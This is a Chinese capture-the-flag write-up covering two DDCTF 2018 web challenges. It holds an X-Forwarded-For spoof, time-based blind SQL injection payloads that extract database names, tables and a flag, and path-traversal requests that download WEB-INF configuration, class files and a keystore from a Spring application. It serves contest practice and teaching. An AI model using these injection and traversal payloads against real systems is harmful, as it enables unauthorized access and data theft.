---
title: DDCTF 2018 web writeup
tags: 
  - ctf
date: 2018-04-21 20:53:50
---

# DDCTF 2018 2道WEB Writeup

<!-- more -->
## WEB00 数据库的秘密
#### step 1:
index.php 需要以IP:116.85.43.88访问，http头加入 X-Forwarded-For: 116.85.43.88 绕过
#### step 2:
绕过后是一个简单的查询功能，简单测试后发现id,title,date有安全处理，但是表单中还隐藏着author，并且没有做任何处理。以payload`a%' && '%'='%`、`a%' && '%'!='%`确定注入存在,想着用union直接提取出来，发现后台还有WAF，没绕过去，但是对于盲注，成功构造出了payload`a%'&&if(1, sleep (5),1)='%`,发生5秒延迟。（后来想想其实可以用bool型盲注提取数据）
#### step 3:
确认了author字段可以注入，但是这道题还有一个问题就是sha1校验，要想写脚本，必须先解决这个问题。研究了一下main.js，发现以类似`id=title=date=author=time=`的字符串sha1处理后后台校验
#### step 4:
写脚本，主要包括sha1校验和时间盲注，贴一下payload

```
payload_1 = "a%' && if((selEct LENGTH(schema_name) from information_schema.schemata limit {0},1)={1},sleep (5),1)='%"
payload_2 = "a%' && if((selEct substr(schema_name,{0},1) from information_schema.schemata limit {1},1)='{2}',sleep (5),1)='%"
# 获取到库名 ddctf
payload_3 = "a%' && if((selEct LENGTH(table_name) from information_schema.tables where table_schema='ddctf' limit {0},1)='{1}',sleep (5),1)='%"
payload_4 = "a%' && if((selEct substr(table_name,{0},1) from information_schema.tables where table_schema='ddctf' limit {1},1)='{2}',sleep (5),1)='%"
# 获取到表名 message, ctf_key4
payload_5 = "a%' && if((selEct LENGTH(column_name) from information_schema.columns where table_schema='ddctf'&&table_name='ctf_key4' limit {0},1)='{1}',sleep (10),1)='%"
payload_6 = "a%' && if((selEct substr(column_name,{0},1) from information_schema.columns where table_schema='ddctf'&&table_name='ctf_key4' limit {1},1)='{2}',sleep (10),1)='%"
# 获取到列名 ctf_key4:secvalue; message: id,title,author,time,status
payload_5 = "a%' && if((selEct LENGTH(secvalue) from ctf_key4 limit {0},1)='{1}',sleep (10),1)='%"
payload_6 = "a%' && if((selEct substr(secvalue,{0},1) from ctf_key4 limit {1},1)='{2}',sleep (10),1)='%"
# 获取到flag DDCTF{MSBMCTFMXOCBYFYI}
```

## WEB01 专属链接
#### step 1:
根据题目提示，题目只跟链接IP有关，所以主要有
```
http://116.85.48.102:5050/welcom/uuid #主页 注意到上面有email:3814166715717836733@didichuxing.com
http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28= # 给了提示，只能下载.class,.ks,.ico,.xml文件
http://116.85.48.102:5050/news/topFiveNews # 没用
http://116.85.48.102:5050//flag/testflag/yourflag #访问报错，但是暴露了控制器路径com.didichuxing.ctf.controller.user.FlagController.java
```
#### step 2:
那么接下来就是猜路径了，在github上找了个springmvc+mybatis的[项目](https://github.com/liyifeng1994/ssm),经过测试，发现一下几个文件

- ../../WEB-INF/web.xml # 得到WEB-INF/applicationContext.xml，com.didichuxing.ctf.listener.InitListener
- ../../WEB-INF/applicationContext.xml # 得到classpath:mybatis/config.xml
- ../../WEB-INF/classes/mybatis/config.xml # 得到mapper/FlagMapper.xml
- ../../WEB-INF/classes/mapper/FlagMapper.xml # sql语句
- ../../WEB-INF/classes/com/didichuxing/ctf/model/Flag.class
- ../../WEB-INF/classes/com/didichuxing/ctf/listener/InitListener.class
- ../../WEB-INF/classes/com/didichuxing/ctf/controller/user/FlagController.class
- ../../WEB-INF/classes/sdl.ks # 密钥文件
- ../../WEB-INF/classes/com/didichuxing/ctf/service/impl/FlagServiceImpl.class
- ../../WEB-INF/classes/com/didichuxing/ctf/dao/FlagDao.class

#### step 3:
把上述的class文件[在线反编译](http://www.javadecompilers.com/)到java，阅读后发现flagController.java

```
@RequestMapping(value={"/getflag/{email:[0-9a-zA-Z']+}"}, method={org.springframework.web.bind.annotation.RequestMethod.POST})
  public String getFlag(@PathVariable("email") String email, ModelMap model)
  {
    Flag flag = flagService.getFlagByEmail(email);


    return "Encrypted flag : " + flag.getFlag();
  }
```
以用户的邮箱来获取加密的flag，邮箱就是首页上的邮箱，然后通过listener.java得到具体的加密过程

```
        String flag = "DDCTF{" + Math.abs(sr.nextLong()) + "}";
        String uuid = UUID.randomUUID().toString().replace("-", "s");

        byte[] data = cipher.doFinal(flag.getBytes());
        byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());

        Flag flago = new Flag();
        flago.setId(Integer.valueOf(id));
        flago.setFlag(byte2hex(data));
        flago.setEmail(byte2hex(e));
        flago.setOriginFlag(flag);
        flago.setUuid(uuid);
        flago.setOriginEmail(email);
```
可以看到Email被转化为16进制的形式，所以需要先对邮箱做处理，简单编写代码（后面放上来），得到8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27，以`http://116.85.48.102:5050/flag/getflag/8EF662D0406A099B394DC817AB391718DD7BF29CCC1AAF32A7D7AB23C845CA27`请求后得到加密的flag。

#### step 4:
接下来就是写代码解密flag了，因为密钥文件在手，只需编写程序即可，参考https://stackoverflow.com/questions/39518979/basic-program-for-encrypt-decrypt-javax-crypto-badpaddingexception-decryption?utm_medium=organic&utm_source=google_rich_qa&utm_campaign=google_rich_qa
需要注意的是这里用了私钥加密公钥解密。
解密后得到flag



